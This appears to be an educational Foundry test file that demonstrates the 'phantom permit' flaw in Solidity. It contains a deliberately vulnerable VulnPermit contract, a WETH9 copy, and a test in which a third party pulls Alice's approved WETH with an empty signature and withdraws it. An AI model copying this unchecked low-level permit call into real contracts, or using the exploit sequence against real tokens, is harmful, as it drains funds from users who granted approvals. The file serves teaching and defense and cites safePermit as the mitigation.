// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
/*
Demo:
Phantom permit 

Mitigation  
Use safePermit
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24

REF
https://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f
https://medium.com/multichainorg/multichain-contract-vulnerability-post-mortem-d37bfab237c8
*/

contract ContractTest is Test {
        VulnPermit VulnPermitContract;
        WETH9 WETH9Contract;

function setUp() public { 
        WETH9Contract = new WETH9();
        VulnPermitContract = new VulnPermit(IERC20(address(WETH9Contract))); 

    }

function testVulnPhantomPermit() public {

    address alice = vm.addr(1);
    vm.deal(address(alice), 10 ether);  
    address bob = vm.addr(2);


  //  console.log("Alice's STA balance:", STAContract.balanceOf(alice));  // charge 1% fee
    vm.startPrank(alice);
    WETH9Contract.deposit{value:10 ether}();
    WETH9Contract.approve(address(VulnPermitContract),type(uint256).max);
    vm.stopPrank();
    VulnPermitContract.depositWithPermit(address(alice),1000,27,0x0,0x0);
    WETH9Contract.balanceOf(address(VulnPermitContract));
    VulnPermitContract.withdraw(1000);
    WETH9Contract.balanceOf(address(this));
   // console.log("Alice deposit 10000 STA, but Alice's STA balance in VulnVaultContract:",  VulnVaultContract.getBalance(alice));  // charge 1% fee
 //   assertEq(STAContract.balanceOf(address(VulnVaultContract)),VulnVaultContract.getBalance(alice));
    }

/*
function testFeeOnTransfer() public {

    address alice = vm.addr(1);
    address bob = vm.addr(2);
    STAContract.balanceOf(address(this));
    STAContract.transfer(alice,1000000); 
    console.log("Alice's STA balance:", STAContract.balanceOf(alice));  // charge 1% fee
    vm.startPrank(alice);
    STAContract.approve(address(VaultContract),type(uint256).max);
    VaultContract.deposit(10000);
    //VaultContract.getBalance(alice);

    console.log("Alice deposit 10000, Alice's STA balance in VaultContract:",  VaultContract.getBalance(alice));  // charge 1% fee
    assertEq(STAContract.balanceOf(address(VaultContract)),VaultContract.getBalance(alice));
    }*/
    receive() payable external{}
}

contract VulnPermit {
    IERC20 public token;

    constructor(IERC20 _token) {
        token = _token;
    }

    function deposit(uint256 amount) public {
        require(token.transferFrom(msg.sender, address(this), amount), "Transfer failed");
    }

    function depositWithPermit(address target, uint256 amount, uint8 v, bytes32 r, bytes32 s) public {
        (bool success,) = address(token).call(abi.encodeWithSignature("permit(address,uint256,uint8,bytes32,bytes32)", target, amount, v, r, s));
        require(success, "Permit failed");

        require(token.transferFrom(target, address(this), amount), "Transfer failed");
    }

    function withdraw(uint256 amount) public {
        require(token.transfer(msg.sender, amount), "Transfer failed");
    }
}

contract WETH9 {
    string public name     = "Wrapped Ether";
    string public symbol   = "WETH";
    uint8  public decimals = 18;

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);

    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;

    fallback() external payable {
        deposit();
    }
    receive() payable external{}

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        payable(msg.sender).transfer(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
        public
        returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != type(uint128).max) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}

